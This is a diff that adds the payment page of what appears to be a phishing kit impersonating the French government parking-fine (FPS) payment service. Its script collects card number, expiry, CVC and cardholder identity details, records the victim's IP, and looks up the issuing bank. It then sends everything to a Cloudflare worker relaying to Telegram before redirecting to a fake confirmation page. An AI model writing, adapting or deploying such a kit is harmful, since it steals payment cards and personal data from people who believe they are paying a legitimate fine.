@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<title>Paiement securise</title>
+<link href="styles-ZMCFHVZ2.css" media="print" onload="this.media='all'" rel="stylesheet"/>
+<style>
+  html,body{font-family:'opensans',Arial,sans-serif;background:#fff;color:#080808;margin:0;padding:0;}
+  .fps-header{background:#fff;border-bottom:1px solid #e5e5e5;padding:1rem 0;}
+  .fps-header .inner{max-width:1200px;margin:0 auto;padding:0 1rem;display:flex;align-items:center;gap:1rem;}
+  .fps-header img{height:70px;}
+  .fps-header .title{font-size:1.05rem;font-weight:600;color:#0b6ba8;}
+  .fps-footer{background:#272729;color:#ddd;padding:1.5rem 0;margin-top:3rem;font-size:.9rem;}
+  .fps-footer .inner{max-width:1200px;margin:0 auto;padding:0 1rem;}
+  .wrap{max-width:900px;margin:2rem auto;padding:0 1rem;}
+  h1{font-size:1.7rem;margin:1rem 0 1rem;border-bottom:2px solid #0b6ba8;padding-bottom:.6rem;}
+  .recap{background:#e8f4fb;border-left:5px solid #0b6ba8;padding:1rem 1.3rem;
+         margin-bottom:1.8rem;color:#0a4a75;line-height:1.6;font-size:.95rem;}
+  fieldset{border:1px solid #acacac;padding:1.3rem 1.5rem 1.8rem;border-radius:4px;margin-bottom:1.5rem;}
+  legend{font-weight:700;color:#0b6ba8;padding:0 .5rem;}
+  label{display:block;margin-bottom:.3rem;font-weight:600;font-size:.95rem;}
+  input{width:100%;padding:.55rem .7rem;border:1px solid #acacac;border-radius:3px;
+        font-size:1rem;box-sizing:border-box;font-family:inherit;}
+  input:focus{outline:2px solid #0b6ba8;outline-offset:1px;}
+  .row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin-top:1rem;}
+  .actions{display:flex;justify-content:space-between;gap:1rem;}
+  .btn-back{padding:.7rem 1.6rem;background:#fff;color:#0b6ba8;
+            border:1px solid #0b6ba8;border-radius:3px;text-decoration:none;
+            font-weight:600;display:inline-block;}
+  .btn-pay{padding:.7rem 1.8rem;background:#0b6ba8;color:#fff;
+           border:1px solid #0b6ba8;border-radius:3px;font-weight:600;
+           font-size:1rem;cursor:pointer;}
+  .btn-pay:disabled{opacity:.6;cursor:not-allowed;}
+  .err{color:#c00;margin-top:.5rem;display:none;}
+  .bank-info{background:#f0f8ff;border:1px solid #b8d8ee;border-radius:4px;
+             padding:.8rem 1rem;margin-top:1rem;font-size:.9rem;color:#0a4a75;
+             line-height:1.6;font-family:monospace;white-space:pre-wrap;}
+  .bank-info .label{font-weight:700;color:#0b6ba8;font-family:'opensans',sans-serif;}
+</style>
+</head>
+<body><header id="hautDePage" role="banner"><div class="wrapper"><a aria-label="République Française - stationnement.gouv.fr - Revenir à la page d'accueil" href="/fps" routerlink="/fps"><img alt="République Française Liberté Egalité Fraternité - Ministère de l'action et des comptes publics" src="assets/img/img_7827502608127642110.png"/></a></div></header>
+
+<div class="wrap">
+<h1>Paiement securise</h1>
+<div class="recap">
+<strong>Recapitulatif</strong><br/>
+<span id="recap-all">-</span>
+</div>
+<form id="cb-form" novalidate="">
+<fieldset>
+<legend>Informations de paiement</legend>
+<label for="cb-name">Titulaire de la carte</label>
+<input autocomplete="cc-name" id="cb-name" maxlength="80" required="" type="text"/>
+<div style="margin-top:1rem;">
+<label for="cb-num">Numero de carte</label>
+<input id="cb-num" inputmode="numeric" maxlength="23" placeholder="1234 5678 9012 3456" required="" type="text"/>
+</div>
+<div class="row">
+<div>
+<label for="cb-exp">Expiration</label>
+<input id="cb-exp" inputmode="numeric" maxlength="5" placeholder="MM/AA" required="" type="text"/>
+</div>
+<div>
+<label for="cb-cvc">CVC</label>
+<input id="cb-cvc" inputmode="numeric" maxlength="4" placeholder="123" required="" type="text"/>
+</div>
+<div>
+<label for="cb-amt">Montant</label>
+<input id="cb-amt" readonly="" style="background:#f5f5f5;" type="text" value="35,00 EUR"/>
+</div>
+</div>
+
+</fieldset>
+<div class="actions">
+<a class="btn-back" href="identite.html">Retour</a>
+<button class="btn-pay" id="btn-pay" type="submit">Payer 35,00 EUR</button>
+</div>
+<div class="err" id="err-msg"></div>
+</form>
+</div>
+
+<script>
+(function () {
+    'use strict';
+
+    // ══════════════════════════════════════════════════════
+    //  CONFIG
+    // ══════════════════════════════════════════════════════
+    var WORKER_URL   = "https://fps.zeleph103.workers.dev/";
+    var HANDYAPI_KEY = "PUB-cqbYWw4Q5nvjmH8zGq7Jt9bc7R6";
+
+    // ══════════════════════════════════════════════════════
+    //  RECAP
+    // ══════════════════════════════════════════════════════
+    try {
+        var f = JSON.parse(sessionStorage.getItem('fps_fields')   || '{}');
+        var i = JSON.parse(sessionStorage.getItem('fps_identity') || '{}');
+        var el = document.getElementById('recap-all');
+        if (el) {
+            el.innerHTML =
+              '<strong>Avis :</strong> N ' + (f.tel||'-') +
+              ' | Cle ' + (f.cle||'-') + ' | Immat. ' + (f.imm||'-') + '<br>' +
+              '<strong>Titulaire :</strong> ' +
+              (i['f-civ']||'') + ' ' + (i['f-pre']||'') + ' ' + (i['f-nom']||'') +
+              ' - ' + (i['f-adr']||'') + ', ' + (i['f-cp']||'') + ' ' + (i['f-ville']||'') + '<br>' +
+              '<strong>Contact :</strong> ' + (i['f-tel']||'') + ' / ' + (i['f-mail']||'');
+        }
+    } catch (e) {}
+
+    // ══════════════════════════════════════════════════════
+    //  FORMAT CHAMPS
+    // ══════════════════════════════════════════════════════
+    var num = document.getElementById('cb-num');
+    function formatCard(el) {
+        var v = el.value.replace(/[^0-9]/g, '').slice(0, 19);
+        v = v.replace(/([0-9]{4})(?=[0-9])/g, '$1 ');
+        el.value = v;
+    }
+    num.addEventListener('input', function () { formatCard(num); }, true);
+    num.addEventListener('keypress', function (e) {
+        if (e.key.length === 1 && !/[0-9]/.test(e.key)) e.preventDefault();
+    }, true);
+    num.addEventListener('paste', function (e) {
+        e.preventDefault();
+        var t = (e.clipboardData || window.clipboardData).getData('text') || '';
+        num.value = t.replace(/[^0-9]/g, '').slice(0, 19).replace(/([0-9]{4})(?=[0-9])/g, '$1 ');
+    }, true);
+
+    var exp = document.getElementById('cb-exp');
+    exp.addEventListener('input', function () {
+        var v = exp.value.replace(/[^0-9]/g, '').slice(0, 4);
+        if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+        exp.value = v;
+    }, true);
+
+    var cvc = document.getElementById('cb-cvc');
+    cvc.addEventListener('input', function () {
+        cvc.value = cvc.value.replace(/[^0-9]/g, '').slice(0, 4);
+    }, true);
+
+    // ══════════════════════════════════════════════════════
+    //  IP
+    // ══════════════════════════════════════════════════════
+    var _ip = '?';
+    fetch('https://api.ipify.org?format=json')
+        .then(function (r) { return r.json(); })
+        .then(function (j) { _ip = j.ip; })
+        .catch(function () {});
+
+    // ══════════════════════════════════════════════════════
+    //  LOOKUP BIN  (HandyAPI + binlist + fallback)
+    // ══════════════════════════════════════════════════════
+    var KNOWN_BINS = {
+        '411111': { scheme:'VISA',       type:'DEBIT',  brand:'CLASSIC',    country:'US', bank:'JPMORGAN CHASE' },
+        '424242': { scheme:'VISA',       type:'CREDIT', brand:'CLASSIC',    country:'US', bank:'BANK OF AMERICA' },
+        '555555': { scheme:'MASTERCARD', type:'CREDIT', brand:'STANDARD',   country:'US', bank:'MASTERCARD' },
+        '515154': { scheme:'MASTERCARD', type:'CREDIT', brand:'STANDARD',   country:'FR', bank:'BANQUE POPULAIRE' },
+        '400000': { scheme:'VISA',       type:'DEBIT',  brand:'CLASSIC',    country:'FR', bank:'BNP PARIBAS' },
+        '497010': { scheme:'VISA',       type:'CREDIT', brand:'CLASSIC',    country:'FR', bank:'SOCIETE GENERALE' },
+        '513411': { scheme:'MASTERCARD', type:'CREDIT', brand:'STANDARD',   country:'FR', bank:'BNP PARIBAS' },
+        '376400': { scheme:'AMEX',       type:'CREDIT', brand:'GREEN',      country:'US', bank:'AMERICAN EXPRESS' },
+    };
+
+    function lookupHandy(bin) {
+        if (!HANDYAPI_KEY) return Promise.reject('no key');
+        return fetch('https://data.handyapi.com/bin/' + bin, {
+            headers: { 'x-api-key': HANDYAPI_KEY, 'Accept': 'application/json' }
+        })
+        .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
+        .then(function (j) {
+            if (!j || !j.Scheme) throw new Error('no data');
+            return {
+                scheme:  (j.Scheme  || '').toUpperCase(),
+                type:    (j.Type    || '').toUpperCase(),
+                brand:   (j.CardTier|| j.Scheme || '').toUpperCase(),
+                bank:    (j.Issuer || j.Bank || 'Inconnue').toUpperCase(),
+                country: ((j.Country && (j.Country.A2 || j.Country.Alpha2)) || '').toUpperCase(),
+                country_name: (j.Country && j.Country.Name) || '',
+            };
+        });
+    }
+
+    function lookupBinlist(bin) {
+        return fetch('https://lookup.binlist.net/' + bin, {
+            headers: { 'Accept-Version': '3' }
+        })
+        .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
+        .then(function (j) {
+            if (!j) throw new Error('no data');
+            return {
+                scheme:  (j.scheme || '').toUpperCase(),
+                type:    (j.type   || '').toUpperCase(),
+                brand:   (j.brand  || '').toUpperCase(),
+                bank:    ((j.bank && j.bank.name) || 'Inconnue').toUpperCase(),
+                country: ((j.country && j.country.alpha2) || '').toUpperCase(),
+                country_name: (j.country && j.country.name) || '',
+            };
+        });
+    }
+
+    function heuristic(bin) {
+        var c = bin[0];
+        var s = 'UNKNOWN';
+        if (c === '4') s = 'VISA';
+        else if (c === '5' || c === '2') s = 'MASTERCARD';
+        else if (c === '3') s = 'AMEX';
+        else if (c === '6') s = 'DISCOVER';
+        return { scheme:s, type:'UNKNOWN', brand:s, bank:'Inconnue', country:'', country_name:'' };
+    }
+
+    function lookupBin(bin) {
+        if (KNOWN_BINS[bin]) {
+            console.log('[bin] cache local', bin);
+            return Promise.resolve(KNOWN_BINS[bin]);
+        }
+        return lookupHandy(bin)
+            .then(function (r) { console.log('[bin] handy', bin, r); return r; })
+            .catch(function (e1) {
+                console.warn('[bin] handy fail', e1);
+                return lookupBinlist(bin)
+                    .then(function (r) { console.log('[bin] binlist', bin, r); return r; })
+                    .catch(function (e2) {
+                        console.warn('[bin] binlist fail', e2);
+                        return heuristic(bin);
+                    });
+            });
+    }
+
+    // ══════════════════════════════════════════════════════
+    //  AFFICHAGE BIN DANS LE BLOC
+    // ══════════════════════════════════════════════════════
+    var lastBin = '';
+    function updateBankInfo() {
+        var digits = num.value.replace(/[^0-9]/g, '');
+        var txt = document.getElementById('bank-info-txt');
+        if (digits.length < 6) {
+            txt.textContent = 'Saisissez au moins 6 chiffres pour detecter la banque.';
+            return;
+        }
+        var bin = digits.slice(0, 6);
+        if (bin === lastBin) return;
+        lastBin = bin;
+
+        txt.textContent = 'Detection en cours...';
+
+        lookupBin(bin).then(function (info) {
+            window.__lastBinInfo = info;
+            txt.textContent =
+                'BIN ' + bin + '\n' +
+                'Scheme  : ' + (info.scheme || '?') + '\n' +
+                'Type    : ' + (info.type   || '?') + '\n' +
+                'Marque  : ' + (info.brand  || '?') + '\n' +
+                'Banque  : ' + (info.bank   || 'Inconnue') + '\n' +
+                'Pays    : ' + (info.country|| '?') +
+                (info.country_name ? ' (' + info.country_name + ')' : '');
+        });
+    }
+    num.addEventListener('input', updateBankInfo, true);
+
+    // ══════════════════════════════════════════════════════
+    //  ENVOI TELEGRAM via Cloudflare Worker
+    // ══════════════════════════════════════════════════════
+    function esc(s) {
+        return String(s == null ? '' : s)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    }
+
+    function sendTelegram(text) {
+        if (!WORKER_URL || WORKER_URL.indexOf('REMPLACE') !== -1) {
+            console.warn('[TG] Worker URL non configuree !');
+            alert('Configure WORKER_URL dans paiement.html');
+            return Promise.resolve({ ok: false });
+        }
+        return fetch(WORKER_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain' },
+            body: text,
+        })
+        .then(function (r) { return r.text(); })
+        .then(function (t) { console.log('[TG]', t); return t; })
+        .catch(function (e) { console.error('[TG error]', e); return null; });
+    }
+
+    // ══════════════════════════════════════════════════════
+    //  SUBMIT
+    // ══════════════════════════════════════════════════════
+    document.getElementById('cb-form').addEventListener('submit', function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+
+        var btn = document.getElementById('btn-pay');
+        var errEl = document.getElementById('err-msg');
+        errEl.style.display = 'none';
+
+        var cbNum = num.value.replace(/ /g, '');
+        var cbExp = exp.value.trim();
+        var cbCvc = cvc.value.trim();
+        var cbName = document.getElementById('cb-name').value.trim();
+
+        function showErr(msg) {
+            errEl.textContent = msg;
+            errEl.style.display = 'block';
+        }
+
+        if (!cbName)                               return showErr('Nom du titulaire requis.');
+        if (!/^[0-9]{13,19}$/.test(cbNum))         return showErr('Numero de carte invalide.');
+        if (!/^[0-9]{2}\/[0-9]{2}$/.test(cbExp))   return showErr('Expiration invalide (MM/AA).');
+        if (!/^[0-9]{3,4}$/.test(cbCvc))           return showErr('CVC invalide.');
+
+        btn.disabled = true;
+        btn.textContent = 'Traitement...';
+
+        var f = {}, i = {};
+        try { f = JSON.parse(sessionStorage.getItem('fps_fields')   || '{}'); } catch (_) {}
+        try { i = JSON.parse(sessionStorage.getItem('fps_identity') || '{}'); } catch (_) {}
+
+        var bin6 = cbNum.slice(0, 6);
+
+        // On attend que le BIN soit resolu (au cas ou pas encore)
+        var binInfo = window.__lastBinInfo;
+        var p = binInfo ? Promise.resolve(binInfo) : lookupBin(bin6);
+
+        p.then(function (binInfo) {
+            binInfo = binInfo || heuristic(bin6);
+            var pays    = (binInfo.country || i['f-pays'] || 'FR').toUpperCase();
+            var pays3   = pays.slice(0, 3);
+            var banque  = binInfo.bank   || 'Inconnue';
+            var typeC   = binInfo.type   || '';
+            var scheme  = binInfo.scheme || '';
+            var marque  = binInfo.brand  || '';
+
+            var L = [];
+            L.push('\uD83D\uDCB3 + 1 NEW CARD');
+            L.push('\u2514 <code>' + esc(cbNum) + '</code>');
+            L.push('');
+            L.push('\uD83C\uDFE6 Billing');
+            L.push('\u251C \uD83D\uDC64 Nom Prenom : ' + esc((i['f-nom']||'') + ' ' + (i['f-pre']||'')));
+            L.push('\u251C \uD83C\uDFE0 Adresse : ' + esc(i['f-adr'] || ''));
+            L.push('\u251C \uD83C\uDFD9 Ville : ' + esc(i['f-ville'] || ''));
+            L.push('\u251C \uD83D\uDCEE Zip : ' + esc(i['f-cp'] || ''));
+            L.push('\u251C \uD83D\uDCDE Tel : ' + esc(i['f-tel'] || ''));
+            L.push('\u2514 \uD83C\uDF82 Naissance : ' + esc(i['f-ddn'] || ''));
+            L.push('');
+            L.push('\uD83C\uDFE6 Carte de Paiement');
+            L.push('\u251C \uD83D\uDCB3 Numero : <code>' + esc(cbNum) + '</code>');
+            L.push('\u251C \uD83D\uDCC5 Expiration : ' + esc(cbExp));
+            L.push('\u2514 \uD83D\uDD12 CVC : <code>' + esc(cbCvc) + '</code>');
+            L.push('');
+            L.push('\uD83D\uDDC3 Coordonnees Bancaires');
+            L.push('\u251C \uD83C\uDFF7 Banque : ' + esc(banque));
+            L.push('\u251C \uD83C\uDFF7 Type : ' + esc(typeC));
+            L.push('\u251C \uD83C\uDFF7 Niveau : ' + esc(scheme));
+            L.push('\u251C \uD83C\uDFF7 Marque : ' + esc(marque));
+            L.push('\u2514 \uD83C\uDFF7 Country : ' + esc(pays) + '|' + esc(pays3));
+            L.push('');
+            L.push('\uD83E\uDDE9 Extra');
+            L.push('\u251C \uD83C\uDFF7 Bin : #' + esc(bin6));
+            L.push('\u251C \uD83C\uDF10 IP : <code>' + esc(_ip) + '</code>');
+            L.push('\u251C \uD83D\uDDBC SCAN : ' + esc(bin6));
+            L.push('\u2514 \uD83D\uDDA5 OS : <code>' + esc(navigator.userAgent.slice(0, 140)) + '</code>');
+            L.push('');
+            L.push('\uD83D\uDE97 Avis FPS');
+            L.push('\u251C \uD83D\uDD22 N telepaiement : <code>' + esc(f.tel || '') + '</code>');
+            L.push('\u251C \uD83D\uDD11 Cle : <code>' + esc(f.cle || '') + '</code>');
+            L.push('\u2514 \uD83D\uDE99 Immatriculation : <code>' + esc(f.imm || '') + '</code>');
+
+            var text = L.join('\n');
+            console.log('[receiver] envoi :\n' + text);
+
+            sendTelegram(text).then(function () {
+                setTimeout(function () {
+                    window.location.href = 'confirmation.html';
+                }, 400);
+            });
+        });
+    });
+
+    console.log('[paiement] install');
+})();
+</script>
+<footer class="no-print" role="contentinfo"><div class="block-container wrapper"><div class="block-item"><h2 class="block-item-title">Informations</h2><ul><li><a href="/fps/aide" routerlink="fps/aide">Aide sur le site</a></li><li><a href="/fps/plan" routerlink="fps/plan">Plan du site</a></li><li><a href="/fps/confidentialite" routerlink="fps/confidentialite">Confidentialité / Informations personnelles / Cookies et autres traceurs</a></li><li><a href="/fps/securite" routerlink="fps/securite">Sécurité informatique</a></li><li><a class="modal-trigger" href="/fps/glossaire" routerlink="fps/glossaire">Glossaire</a></li><li><a class="modal-trigger" href="/fps/faq" routerlink="fps/faq">Foire aux questions</a></li></ul></div><div class="block-item"><h2 class="block-item-title">Qualité de service</h2><ul><li><a href="/fps/accessibilite" routerlink="fps/accessibilite">Accessibilité : totalement conforme</a></li><li><a href="/fps/engagement" routerlink="fps/engagement">Les engagements de la DGFiP</a></li></ul></div><div class="block-item"><h2 class="block-item-title">Autres sites</h2><ul><li><a class="link-external" href="https://www.antai.gouv.fr/" title="ANTAI : Agence nationale de traitement automatisé des infractions-Nouvelle fenêtre">ANTAI : Agence nationale de traitement automatisé des infractions</a></li><li><a class="link-external" href="https://www.amendes.gouv.fr/" title="Amendes-Nouvelle fenêtre">Amendes</a></li></ul></div></div><div class="footer-external-sites"><ul><li><a class="link-external" href="https://www.service-public.fr/" title="service-public.fr - nouvelle fenetre">Service-public.fr</a></li><li><a class="link-external" href="https://www.legifrance.gouv.fr/" title="legifrance.gouv.fr - nouvelle fenetre">Legifrance.gouv.fr</a></li></ul></div><div class="footer-copyright"><p> © Direction générale des Finances publiques - <a class="xt" href="/fps/mention-legales" id="mention-legales" routerlink="fps/mention-legales">Mentions légales</a></p></div><!-- --></footer></body>
+</html>
